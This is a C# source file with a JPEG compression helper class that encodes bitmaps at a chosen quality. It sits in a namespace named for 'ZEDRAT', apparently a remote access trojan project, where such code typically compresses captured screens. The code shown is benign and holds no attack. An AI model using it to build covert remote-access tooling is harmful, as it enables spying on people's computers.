using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace ZEDRatApp.ZEDRAT.Compression
{
	public class JpgCompression : IDisposable
	{
		private readonly ImageCodecInfo _encoderInfo;

		private readonly EncoderParameters _encoderParams;

		public JpgCompression(long quality)
		{
			EncoderParameter encoderParameter = new EncoderParameter(Encoder.Quality, quality);
			this._encoderInfo = this.GetEncoderInfo("image/jpeg");
			this._encoderParams = new EncoderParameters(2);
			this._encoderParams.Param[0] = encoderParameter;
			this._encoderParams.Param[1] = new EncoderParameter(Encoder.Compression, 5L);
		}

		public void Dispose()
		{
			this.Dispose(disposing: true);
			GC.SuppressFinalize(this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (disposing && this._encoderParams != null)
			{
				try
				{
					this._encoderParams.Dispose();
				}
				catch
				{
				}
			}
		}

		public byte[] Compress(Bitmap bmp)
		{
			using MemoryStream memoryStream = new MemoryStream();
			bmp.Save(memoryStream, this._encoderInfo, this._encoderParams);
			return memoryStream.ToArray();
		}

		public void Compress(Bitmap bmp, ref Stream targetStream)
		{
			bmp.Save(targetStream, this._encoderInfo, this._encoderParams);
		}

		private ImageCodecInfo GetEncoderInfo(string mimeType)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = imageEncoders.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (imageEncoders[i].MimeType == mimeType)
				{
					return imageEncoders[i];
				}
			}
			return null;
		}
	}
}
